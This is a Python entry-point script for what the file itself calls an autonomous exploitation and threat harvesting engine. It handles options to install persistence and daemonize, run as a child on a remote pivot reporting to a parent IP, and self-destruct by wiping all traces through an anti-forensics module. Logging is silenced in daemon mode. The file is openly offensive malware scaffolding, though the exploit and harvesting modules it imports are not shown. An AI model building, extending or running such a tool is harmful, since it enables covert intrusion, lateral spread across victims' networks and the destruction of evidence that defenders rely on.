#!/usr/bin/env python3
"""
AETHERIC - Autonomous Exploitation & Threat Harvesting Engine
Entry point: argument parsing, daemon launching, and orchestration startup.
"""
import sys
import os
import argparse
import logging
from core.daemonizer import Daemonizer
from core.orchestrator import Orchestrator
from core.anti_forensics import AntiForensics
from utils.logging_utils import setup_logging
from dotenv import load_dotenv
load_dotenv()
def main():
    parser = argparse.ArgumentParser(description="AETHERIC Agent")
    parser.add_argument('--install', action='store_true', help='Install persistence and start daemon')
    parser.add_argument('--child', action='store_true', help='Run as child on remote pivot')
    parser.add_argument('--parent-ip', type=str, help='IP of parent for reporting (used with --child)')
    parser.add_argument('--resume', action='store_true', help='Resume from interrupted state (not fully implemented)')
    parser.add_argument('--self-destruct', action='store_true', help='Wipe all traces and exit')
    args = parser.parse_args()

    # Setup logging (will be redirected to /dev/null in daemon mode)
    setup_logging()

    if args.self_destruct:
        af = AntiForensics()
        af.full_wipe()
        sys.exit(0)

    if args.install:
        # Install persistence and then daemonize
        daemon = Daemonizer()
        daemon.install_persistence()
        daemon.daemonize()
        # After daemonization, orchestrator runs
        orch = Orchestrator(child_mode=False)
        orch.run()
    elif args.child:
        # Child mode: run with parent IP for reporting
        orch = Orchestrator(child_mode=True, parent_ip=args.parent_ip)
        orch.run()
    else:
        # Standalone run (not daemonized) - for debugging
        orch = Orchestrator()
        orch.run()

if __name__ == '__main__':
    main()
